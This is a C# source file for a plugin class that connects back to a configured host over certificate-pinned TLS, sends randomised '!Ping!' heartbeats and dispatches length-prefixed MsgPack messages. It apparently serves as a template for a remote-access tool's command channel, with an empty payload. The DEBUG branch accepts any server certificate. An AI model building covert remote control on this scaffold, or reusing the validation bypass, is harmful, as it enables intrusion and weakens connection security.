﻿using Msg;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace Plugin
{
    public class Plugin
    {
        public static string Host { get; set; }
        public static int Port { get; set; }
        public static Socket TcpClient { get; set; }
        private static SslStream SslClient { get; set; }
        private static byte[] Buffer { get; set; }
        private static long Buffersize { get; set; }
        private static MemoryStream MS { get; set; }
        public static bool IsConnected { get; set; }
        private static object SendSync { get; } = new object();
        private static Timer Tick { get; set; }

        private static X509Certificate2 ServerCertificate;

        public static void Initialize(byte[] args)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(args);
                Host = unpack_msgpack.ForcePathObject("Host").AsString;
                Port = Convert.ToInt32(unpack_msgpack.ForcePathObject("Port").AsString);
                ServerCertificate = new X509Certificate2(Convert.FromBase64String(unpack_msgpack.ForcePathObject("Certificate").AsString));
                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                TcpClient.Connect(Host, Port);

                MessageBox.Show("Plugin Connected!");
                IsConnected = true;
                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                Buffer = new byte[4];
                MS = new MemoryStream();
                Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
                SslClient.BeginRead(Buffer, 0, Buffer.Length, BeginRead_Callback, null);
                //Do something
            }
            catch
            {
                MessageBox.Show("Plugin Disconnected!");
            }
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return ServerCertificate.Equals(certificate);
        }


        public static void Dispose()
        {
            try
            {
                IsConnected = false;
                Tick?.Dispose();
                try
                {
                    TcpClient.Shutdown(SocketShutdown.Both);
                }
                catch { }
                try
                {
                    SslClient?.Dispose();
                    TcpClient?.Dispose();
                }
                catch { }
                MS?.Dispose();
            }
            catch { }
            finally
            {
                GC.Collect();
            }
        }


        private static void BeginRead_Callback(IAsyncResult ar)
        {
            try
            {
                if (!IsConnected || !TcpClient.Connected)
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    if (MS.Length == 4)
                    {
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Plugin Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            while (MS.Length != Buffersize)
                            {
                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
                                if (rc == 0)
                                {
                                    IsConnected = false;
                                    Dispose();
                                    return;
                                }
                                MS.Write(Buffer, 0, rc);
                                Buffer = new byte[Buffersize - MS.Length];
                            }
                            if (MS.Length == Buffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Read.ReadData, MS.ToArray());
                                Buffer = new byte[4];
                                MS.Dispose();
                                MS = new MemoryStream();
                            }
                        }
                    }
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, BeginRead_Callback, null);
                }
                else
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                Dispose();
                return;
            }
        }


        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {

                    byte[] buffer = msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);
                    SslClient.Write(buffer, 0, buffer.Length);
                }
                catch
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
        }


        private static void CheckServer(object obj)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "!Ping!";
            //msgpack.ForcePathObject("Message").AsString = "";
            Send(msgpack.Encode2Bytes());
        }

    }
}
